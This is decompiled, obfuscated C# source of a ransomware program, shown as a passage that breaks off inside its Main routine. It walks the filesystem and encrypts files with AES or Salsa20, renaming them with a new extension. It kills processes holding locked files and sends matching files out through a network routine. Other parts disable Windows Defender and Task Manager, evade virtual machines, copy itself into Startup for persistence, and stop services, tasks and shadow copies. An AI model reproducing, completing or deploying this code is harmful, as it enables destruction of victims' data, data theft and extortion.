using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Complex.Cryptography;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace Complex;

internal sealed class Program
{
	public sealed class RecursiveFileSearch
	{
		private static StringCollection log;

		private static List<string> result;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107407015));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107393163)) && !text.ToLower().Contains(getString_0(107407010)) && !text.ToLower().Contains(getString_0(107393641)) && !text.ToLower().Contains(getString_0(107393628)) && !text.ToLower().Contains(getString_0(107406965)) && !text.ToLower().Contains(getString_0(107393550)) && !text.ToLower().Contains(getString_0(107393402)) && !text.ToLower().Contains(getString_0(107393417)) && !text.ToLower().Contains(getString_0(107392856)) && !text.ToLower().Contains(getString_0(107392871)) && !text.ToLower().Contains(getString_0(107392837)) && !text.ToLower().Contains(getString_0(107392788)) && !text.ToLower().Contains(getString_0(107392803)) && !text.ToLower().Contains(getString_0(107392758)) && !text.ToLower().Contains(getString_0(107392769)) && !text.ToLower().Contains(getString_0(107392724)) && !text.ToLower().Contains(getString_0(107392743)) && !text.ToLower().Contains(getString_0(107392694)) && !text.ToLower().Contains(getString_0(107392709)) && !text.Contains(Base64Decode(getString_0(107392660))) && !text.Contains(getString_0(107392635)) && !text.Contains(getString_0(107392622)) && !text.EndsWith(getString_0(107396001)) && !text.EndsWith(getString_0(107393109)) && !text.EndsWith(getString_0(107393104)) && !text.EndsWith(getString_0(107393131)) && !text.EndsWith(getString_0(107393126)) && !text.ToLower().Contains(getString_0(107393121)) && !text.ToLower().Contains(MyStartName))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(Mb) * 1024.0 * 1024.0 && Size == getString_0(107396920))
							{
								result.Add(text);
							}
							else if (File.Exists(text) && Size == getString_0(107396377))
							{
								result.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return result;
		}

		static RecursiveFileSearch()
		{
			Strings.CreateGetStringDelegate(typeof(RecursiveFileSearch));
			log = new StringCollection();
			result = new List<string>();
		}
	}

	private sealed class _003C_003Ec__DisplayClassf
	{
		public string thisprocessname;

		public bool _003CMain_003Eb__5(Process process_0)
		{
			return process_0.ProcessName == thisprocessname;
		}
	}

	private sealed class _003C_003Ec__DisplayClass21
	{
		private sealed class _003C_003Ec__DisplayClass25
		{
			public _003C_003Ec__DisplayClass21 CS_0024_003C_003E8__locals22;

			public string t;

			public void _003CCrypt_003Eb__1f()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					SetAccess(WindowsIdentity.GetCurrent().Name, t);
				}
			}

			public void _003CCrypt_003Eb__20()
			{
				WorkerCrypter(t, CS_0024_003C_003E8__locals22.uzantilar, CS_0024_003C_003E8__locals22.crypt_uzantisi, CS_0024_003C_003E8__locals22.excomunicated, CS_0024_003C_003E8__locals22.sifre);
			}
		}

		public string[] uzantilar;

		public string[] excomunicated;

		public string sifre;

		public string crypt_uzantisi;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__1e(string string_0)
		{
			_003C_003Ec__DisplayClass25 CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClass25();
			CS_0024_003C_003E8__locals0.CS_0024_003C_003E8__locals22 = this;
			CS_0024_003C_003E8__locals0.t = string_0;
			if (AccessToken && !getOSInfo().Contains(getString_0(107389590)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						SetAccess(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.t);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (MultipleThreads == getString_0(107396926))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					WorkerCrypter(CS_0024_003C_003E8__locals0.t, CS_0024_003C_003E8__locals0.CS_0024_003C_003E8__locals22.uzantilar, CS_0024_003C_003E8__locals0.CS_0024_003C_003E8__locals22.crypt_uzantisi, CS_0024_003C_003E8__locals0.CS_0024_003C_003E8__locals22.excomunicated, CS_0024_003C_003E8__locals0.CS_0024_003C_003E8__locals22.sifre);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				WorkerCrypter(CS_0024_003C_003E8__locals0.t, uzantilar, crypt_uzantisi, excomunicated, sifre);
			}
		}

		static _003C_003Ec__DisplayClass21()
		{
			Strings.CreateGetStringDelegate(typeof(_003C_003Ec__DisplayClass21));
		}
	}

	private sealed class _003C_003Ec__DisplayClass31
	{
		private sealed class _003C_003Ec__DisplayClass34
		{
			public _003C_003Ec__DisplayClass31 CS_0024_003C_003E8__locals32;

			public string partfileInfo;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2c()
			{
				foreach (string item in extstyl)
				{
					if (partfileInfo.ToLower().EndsWith(item + CS_0024_003C_003E8__locals32.extension) && LimitMe == getString_0(107396937))
					{
						if (Convert.ToInt32(MaxSize) * 1024 * 1024 > new FileInfo(partfileInfo).Length)
						{
							try
							{
								UtilMe.SendB(getString_0(107394009), getString_0(107394004), getString_0(107393959), partfileInfo);
							}
							catch
							{
							}
						}
					}
					else if (partfileInfo.ToLower().EndsWith(item) && LimitMe == getString_0(107396394))
					{
						try
						{
							UtilMe.SendB(getString_0(107394009), getString_0(107394004), getString_0(107393959), partfileInfo);
						}
						catch
						{
						}
					}
				}
			}

			static _003C_003Ec__DisplayClass34()
			{
				Strings.CreateGetStringDelegate(typeof(_003C_003Ec__DisplayClass34));
			}
		}

		private sealed class _003C_003Ec__DisplayClass37
		{
			public _003C_003Ec__DisplayClass31 CS_0024_003C_003E8__locals32;

			public string fileInfo;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2e()
			{
				foreach (string item in extstyl)
				{
					if (fileInfo.ToLower().EndsWith(item + CS_0024_003C_003E8__locals32.extension) && LimitMe == getString_0(107396940))
					{
						if (Convert.ToInt32(MaxSize) * 1024 * 1024 > new FileInfo(fileInfo).Length)
						{
							try
							{
								UtilMe.SendB(getString_0(107394012), getString_0(107394007), getString_0(107393962), fileInfo);
							}
							catch
							{
							}
						}
					}
					else if (fileInfo.ToLower().EndsWith(item) && LimitMe == getString_0(107396397))
					{
						try
						{
							UtilMe.SendB(getString_0(107394012), getString_0(107394007), getString_0(107393962), fileInfo);
						}
						catch
						{
						}
					}
				}
			}

			static _003C_003Ec__DisplayClass37()
			{
				Strings.CreateGetStringDelegate(typeof(_003C_003Ec__DisplayClass37));
			}
		}

		public List<string> domeall;

		public List<string> files;

		public string extension;

		public string[] excluded;

		public string DynamicPass;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__2b(string string_0)
		{
			_003C_003Ec__DisplayClass34 CS_0024_003C_003E8__locals0;
			foreach (string file in files)
			{
				if (excluded.Length != 0)
				{
					string[] array = excluded;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!file.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_06c5;
					}
				}
				try
				{
					if (file.EndsWith(extension))
					{
						goto IL_06c5;
					}
				}
				catch (Exception)
				{
					goto IL_06c5;
				}
				if (!file.EndsWith(string_0) || EncryptedFiles.Contains(file))
				{
					continue;
				}
				if (ReleaseLockedFiles == getString_0(107396934))
				{
					try
					{
						if (LockedFiles.Islocked(file))
						{
							LockedFiles.Killproc(file);
						}
					}
					catch
					{
					}
				}
				EncryptedFiles.Add(file);
				if (!EncryptedDirs.Contains(Path.GetDirectoryName(file)))
				{
					EncryptedDirs.Add(Path.GetDirectoryName(file));
				}
				RemoveReadOnlyAttribute(file);
				try
				{
					try
					{
						if (new FileInfo(file).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (debugmode)
						{
							try
							{
								File.AppendAllText(DebugReport, getString_0(107389732) + file + getString_0(107400840) + ex2.Message + getString_0(107396307));
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_00ef;
					}
					if (PartialEncrytion == getString_0(107396934) && new FileInfo(file).Length > Convert.ToInt32(PartialSize) * 1024 * 1024 && !domeall.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClass34();
						CS_0024_003C_003E8__locals0.CS_0024_003C_003E8__locals32 = this;
						try
						{
							if (extension != getString_0(107390029))
							{
								File.Move(file, file + extension);
							}
						}
						catch (Exception ex4)
						{
							if (debugmode)
							{
								try
								{
									File.AppendAllText(DebugReport, getString_0(107389732) + file + getString_0(107401323) + ex4.Message + getString_0(107396307));
									break;
								}
								catch (Exception)
								{
									break;
								}
							}
							break;
						}
						CS_0024_003C_003E8__locals0.partfileInfo = getString_0(107393381);
						if (extension != getString_0(107390029))
						{
							CS_0024_003C_003E8__locals0.partfileInfo = file + extension;
						}
						else
						{
							CS_0024_003C_003E8__locals0.partfileInfo = file;
						}
						if (Styler == getString_0(107396934))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in extstyl)
								{
									if (CS_0024_003C_003E8__locals0.partfileInfo.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.CS_0024_003C_003E8__locals32.extension) && LimitMe == _003C_003Ec__DisplayClass34.getString_0(107396937))
									{
										if (Convert.ToInt32(MaxSize) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.partfileInfo).Length)
										{
											try
											{
												UtilMe.SendB(_003C_003Ec__DisplayClass34.getString_0(107394009), _003C_003Ec__DisplayClass34.getString_0(107394004), _003C_003Ec__DisplayClass34.getString_0(107393959), CS_0024_003C_003E8__locals0.partfileInfo);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.partfileInfo.ToLower().EndsWith(item) && LimitMe == _003C_003Ec__DisplayClass34.getString_0(107396394))
									{
										try
										{
											UtilMe.SendB(_003C_003Ec__DisplayClass34.getString_0(107394009), _003C_003Ec__DisplayClass34.getString_0(107394004), _003C_003Ec__DisplayClass34.getString_0(107393959), CS_0024_003C_003E8__locals0.partfileInfo);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = Crypto.RandomPass(32);
						string s = CryptographyHelper.Encrypt(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = Encryptions.ReadFromFile(CS_0024_003C_003E8__locals0.partfileInfo, Convert.ToInt32(PartialSize) * 1024 * 1024);
						Encryptions.WriteToFile(encrypted: (!chacha) ? (Unique ? Encryptions.AESEncryptBytes(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : Encryptions.AESEncryptBytes(byte_, Encoding.ASCII.GetBytes(DynamicPass), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (Unique ? Salsa20.EncryptSS20(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : Salsa20.EncryptSS20(byte_, Encoding.ASCII.GetBytes(DynamicPass), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), filename: CS_0024_003C_003E8__locals0.partfileInfo, cryptPass: bytes);
					}
					else
					{
						string text2 = Crypto.RandomPass(32);
						string s2 = CryptographyHelper.Encrypt(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (extension != getString_0(107390029))
						{
							if (!chachapetit)
							{
								if (!Unique)
								{
									Encrypt2(file, file + extension, PasswordBytes);
								}
								else
								{
									Encrypt2(file, file + extension, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!Unique)
									{
										Encrypt3(file, file + extension, PasswordBytes);
									}
									else
									{
										Encrypt3(file, file + extension, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (debugmode)
									{
										try
										{
											File.AppendAllText(DebugReport, getString_0(107389732) + file + getString_0(107389983) + ex6.Message + getString_0(107396307));
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!chachapetit)
						{
							if (!Unique)
							{
								Encrypt2(file, file + getString_0(107389992), PasswordBytes);
							}
							else
							{
								Encrypt2(file, file + getString_0(107389992), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!Unique)
								{
									Encrypt3(file, file, PasswordBytes);
								}
								else
								{
									Encrypt3(file, file, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (debugmode)
								{
									try
									{
										File.AppendAllText(DebugReport, getString_0(107389732) + file + getString_0(107389983) + ex8.Message + getString_0(107396307));
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (Unique)
						{
							if (extension != getString_0(107390029))
							{
								WriteSignatureFullEncode(file + extension, bytes2);
							}
							else
							{
								WriteSignatureFullEncode(file, bytes2);
							}
						}
					}
					goto IL_06c5;
					end_IL_00ef:;
				}
				catch (Exception)
				{
					goto IL_06c5;
				}
				continue;
				IL_06c5:
				files.Remove(file);
			}
		}

		public void _003CWorkerCrypter2_003Eb__2d(string string_0)
		{
			_003C_003Ec__DisplayClass37 CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClass37();
			CS_0024_003C_003E8__locals0.CS_0024_003C_003E8__locals32 = this;
			CS_0024_003C_003E8__locals0.fileInfo = string_0;
			if (excluded.Length != 0)
			{
				string[] array = excluded;
				int num = 0;
				while (num < array.Length)
				{
					string value = array[num];
					if (!CS_0024_003C_003E8__locals0.fileInfo.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0748;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.fileInfo.EndsWith(extension))
				{
					goto IL_0748;
				}
			}
			catch (Exception)
			{
				goto IL_0748;
			}
			if (!EncryptedFiles.Contains(CS_0024_003C_003E8__locals0.fileInfo))
			{
				if (ReleaseLockedFiles == getString_0(107396934))
				{
					try
					{
						if (LockedFiles.Islocked(CS_0024_003C_003E8__locals0.fileInfo))
						{
							LockedFiles.Killproc(CS_0024_003C_003E8__locals0.fileInfo);
						}
					}
					catch
					{
					}
				}
				EncryptedFiles.Add(CS_0024_003C_003E8__locals0.fileInfo);
				if (!EncryptedDirs.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.fileInfo)))
				{
					EncryptedDirs.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.fileInfo));
				}
				RemoveReadOnlyAttribute(CS_0024_003C_003E8__locals0.fileInfo);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.fileInfo).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (debugmode)
						{
							try
							{
								File.AppendAllText(DebugReport, getString_0(107389732) + CS_0024_003C_003E8__locals0.fileInfo + getString_0(107400840) + ex2.Message + getString_0(107396307));
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_0117_2;
					}
					if (PartialEncrytion == getString_0(107396934) && new FileInfo(CS_0024_003C_003E8__locals0.fileInfo).Length > Convert.ToInt32(PartialSize) * 1024 * 1024)
					{
						try
						{
							if (extension != getString_0(107390029))
							{
								File.Move(CS_0024_003C_003E8__locals0.fileInfo, CS_0024_003C_003E8__locals0.fileInfo + extension);
							}
						}
						catch (Exception ex4)
						{
							if (debugmode)
							{
								try
								{
									File.AppendAllText(DebugReport, getString_0(107389732) + CS_0024_003C_003E8__locals0.fileInfo + getString_0(107401323) + ex4.Message + getString_0(107396307));
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
							return;
						}
						if (extension != getString_0(107390029))
						{
							CS_0024_003C_003E8__locals0.fileInfo += extension;
						}
						if (Styler == getString_0(107396934))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in extstyl)
								{
									if (CS_0024_003C_003E8__locals0.fileInfo.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.CS_0024_003C_003E8__locals32.extension) && LimitMe == _003C_003Ec__DisplayClass37.getString_0(107396940))
									{
										if (Convert.ToInt32(MaxSize) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.fileInfo).Length)
										{
											try
											{
												UtilMe.SendB(_003C_003Ec__DisplayClass37.getString_0(107394012), _003C_003Ec__DisplayClass37.getString_0(107394007), _003C_003Ec__DisplayClass37.getString_0(107393962), CS_0024_003C_003E8__locals0.fileInfo);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.fileInfo.ToLower().EndsWith(item) && LimitMe == _003C_003Ec__DisplayClass37.getString_0(107396397))
									{
										try
										{
											UtilMe.SendB(_003C_003Ec__DisplayClass37.getString_0(107394012), _003C_003Ec__DisplayClass37.getString_0(107394007), _003C_003Ec__DisplayClass37.getString_0(107393962), CS_0024_003C_003E8__locals0.fileInfo);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = Crypto.RandomPass(32);
						string s = CryptographyHelper.Encrypt(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = Encryptions.ReadFromFile(CS_0024_003C_003E8__locals0.fileInfo, Convert.ToInt32(PartialSize) * 1024 * 1024);
						Encryptions.WriteToFile(encrypted: (!chacha) ? (Unique ? Encryptions.AESEncryptBytes(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : Encryptions.AESEncryptBytes(byte_, Encoding.ASCII.GetBytes(DynamicPass), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (Unique ? Salsa20.EncryptSS20(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : Salsa20.EncryptSS20(byte_, Encoding.ASCII.GetBytes(DynamicPass), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), filename: CS_0024_003C_003E8__locals0.fileInfo, cryptPass: bytes);
					}
					else
					{
						string text2 = Crypto.RandomPass(32);
						string s2 = CryptographyHelper.Encrypt(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (extension != getString_0(107390029))
						{
							if (!chachapetit)
							{
								if (!Unique)
								{
									Encrypt2(CS_0024_003C_003E8__locals0.fileInfo, CS_0024_003C_003E8__locals0.fileInfo + extension, PasswordBytes);
								}
								else
								{
									Encrypt2(CS_0024_003C_003E8__locals0.fileInfo, CS_0024_003C_003E8__locals0.fileInfo + extension, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!Unique)
									{
										Encrypt3(CS_0024_003C_003E8__locals0.fileInfo, CS_0024_003C_003E8__locals0.fileInfo + extension, PasswordBytes);
									}
									else
									{
										Encrypt3(CS_0024_003C_003E8__locals0.fileInfo, CS_0024_003C_003E8__locals0.fileInfo + extension, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (debugmode)
									{
										try
										{
											File.AppendAllText(DebugReport, getString_0(107389732) + CS_0024_003C_003E8__locals0.fileInfo + getString_0(107389983) + ex6.Message + getString_0(107396307));
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!chachapetit)
						{
							if (!Unique)
							{
								Encrypt2(CS_0024_003C_003E8__locals0.fileInfo, CS_0024_003C_003E8__locals0.fileInfo + getString_0(107389992), PasswordBytes);
							}
							else
							{
								Encrypt2(CS_0024_003C_003E8__locals0.fileInfo, CS_0024_003C_003E8__locals0.fileInfo + getString_0(107389992), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!Unique)
								{
									Encrypt3(CS_0024_003C_003E8__locals0.fileInfo, CS_0024_003C_003E8__locals0.fileInfo, PasswordBytes);
								}
								else
								{
									Encrypt3(CS_0024_003C_003E8__locals0.fileInfo, CS_0024_003C_003E8__locals0.fileInfo, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (debugmode)
								{
									try
									{
										File.AppendAllText(DebugReport, getString_0(107389732) + CS_0024_003C_003E8__locals0.fileInfo + getString_0(107389983) + ex8.Message + getString_0(107396307));
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (Unique)
						{
							if (extension != getString_0(107390029))
							{
								WriteSignatureFullEncode(CS_0024_003C_003E8__locals0.fileInfo + extension, bytes2);
							}
							else
							{
								WriteSignatureFullEncode(CS_0024_003C_003E8__locals0.fileInfo, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0748;
			IL_0748:
			files.Remove(CS_0024_003C_003E8__locals0.fileInfo);
		}

		static _003C_003Ec__DisplayClass31()
		{
			Strings.CreateGetStringDelegate(typeof(_003C_003Ec__DisplayClass31));
		}
	}

	private sealed class _003C_003Ec__DisplayClass3f
	{
		public string inputFile;

		public string outputFile;

		public void _003CEncrypt2_003Eb__3b()
		{
			while (true)
			{
				try
				{
					File.Delete(inputFile);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__3c()
		{
			while (true)
			{
				try
				{
					if (File.Exists(outputFile))
					{
						File.Delete(outputFile);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string imha;

	public static byte[] PasswordBytes;

	public static string Size;

	public static string Mb;

	public static List<string> DizonList;

	public static List<string> DoneExtensions;

	public static string Persistence;

	public static string DynamicPass;

	public static string UniqueId;

	public static string DeceiveMe;

	public static int rand;

	public static string ReleaseLockedFiles;

	public static string AntiVM;

	public static string Delay;

	public static string DelayTime;

	public static string DisableDefender;

	public static string DisableAMSI;

	public static string CriticalProcess;

	public static string WallpaperChanger;

	public static List<string> meltList;

	public static List<string> EncryptedDirs;

	public static string SpreadOverNetwork;

	public static string Live4Ever;

	public static string KillTM;

	public static List<string> EncryptedFiles;

	public static string FtpLog;

	private static string appGuid;

	public static string MultipleThreads;

	public static string WoL;

	public static List<string> netShadowList;

	public static List<string> scList;

	public static List<string> taskList;

	public static List<string> vssList;

	public static string PowerList;

	public static List<string> delList;

	public static List<string> DrvList;

	public static string DelayedActivation;

	public static string ExpireOption;

	internal static DateTime ActiveAfterDateTime;

	internal static DateTime ExpireAfterDateTime;

	public static string PartialEncrytion;

	public static string PartialSize;

	public static string StaticLooks;

	public static string SystemFiles;

	public static string RIPmeBiot;

	public static string ADMINISTRATOR;

	public static string FAC;

	public static string Styler;

	public static List<string> extstyl;

	public static string LimitMe;

	public static string MaxSize;

	public static string TransparentMan;

	public static string AlternateAlgo;

	public static string Jerry;

	public static string toolLocation;

	public static string Drag_Drop;

	public static string NotifyMe;

	public static string NotifyCustom;

	public static string LegalTitle;

	public static string LegalText;

	public static string Upper;

	public static string LANShares;

	public static string ProcessAll;

	public static string ReleaseAllFiles;

	public static string FixMBR;

	public static string LogonPass;

	public static string VeryBasicMode;

	public static string HorseMount;

	public static string MyStartName;

	public static string SkipC;

	public static string CatchDrv;

	public static string RichText;

	public static string CredActivate;

	public static string MySign;

	public static string Sniffing;

	public static string Blocks;

	public static string Elevated;

	public static string TerminateCustomProcesses;

	public static string[] CustomProcToTerminate;

	public static string Mmf;

	public static bool chacha;

	public static string ntfsmft;

	public static bool Unique;

	public static bool paexuse;

	public static bool CleanMemory;

	public static bool multinote;

	public static string DebugReport;

	public static bool debugmode;

	public static bool printnote;

	public static bool localreport;

	public static bool AccessToken;

	public static bool chachapetit;

	public static string LocalReportFileName;

	public static List<string> Ip1;

	public static List<string> Ip2;

	public static List<string> Ip3;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegatee;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate15;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate16;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate17;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		try
		{
			_003C_003Ec__DisplayClassf CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClassf();
			CS_0024_003C_003E8__locals0.thisprocessname = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.thisprocessname) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			MutexHelper.CheckMutex(appGuid);
		}
		catch (Exception)
		{
		}
		try
		{
			if (Sniffing == getString_0(107396917))
			{
				Thread thread = new Thread(AntiSniffer.SniffersKiller);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (Delay == getString_0(107396917))
		{
			Thread.Sleep(int.Parse(DelayTime));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && FAC == getString_0(107396917))
		{
			try
			{
				RunPS(Base64Decode(getString_0(107396912)));
			}
			catch
			{
			}
		}
		if (DisableDefender == getString_0(107396917))
		{
			Disable.Defender();
		}
		try
		{
			if (CriticalProcess == getString_0(107396917) && ProcessCritical.IsAdmin())
			{
				new AntiKill().DisTaskManager(bool_0: false);
				ProcessCritical.YesItIs();
			}
		}
		catch (Exception)
		{
		}
		if (Live4Ever == getString_0(107396917) && ProcessCritical.IsAdmin())
		{
			new AntiKill().DisTaskManager(bool_0: false);
			new AntiKill().IamInmortal();
		}
		if (AntiVM == getString_0(107396917))
		{
			Anti_Analysis.RunAntiAnalysis();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107396839);
			string text2 = text + Path.GetFileName(fileName);
			if (DeceiveMe == getString_0(107396917) && fileName != text2)
			{
				Thread thread2 = new Thread(Deceive);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (Persistence == getString_0(107396917) && mainModule != null && fileName != text2)
			{
				try
				{
					rand = NextInt(0, meltList.Count);
					File.Copy(fileName, text + meltList[rand], overwrite: true);
					Process.Start(text + meltList[rand]);
					CleanMyStuff();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (DelayedActivation == getString_0(107396917) && DateTime.Now < ActiveAfterDateTime)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (ExpireOption == getString_0(107396917) && DateTime.Now > ExpireAfterDateTime)
			{
				CleanMyStuff();
			}
		}
		catch
		{
		}
		TerminateSnooper();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate
			{
				List<string> source = scList;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
					{
						ProcessCommand(getString_0(107389945), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				List<string> source2 = netShadowList;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						ProcessCommand(getString_0(107393057), string_0);
					};
				}
				Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				List<string> source3 = taskList;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
					{
						ProcessCommand(Base64Decode(getString_0(107389904)), string_0);
					};
				}
				Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				if (TerminateCustomProcesses == getString_0(107396917))
				{
					string[] customProcToTerminate = CustomProcToTerminate;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
						{
							ProcessCommand(Base64Decode(getString_0(107389904)), getString_0(107389879) + string_0 + getString_0(107389870));
						};
					}
					Parallel.ForEach(customProcToTerminate, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
				}
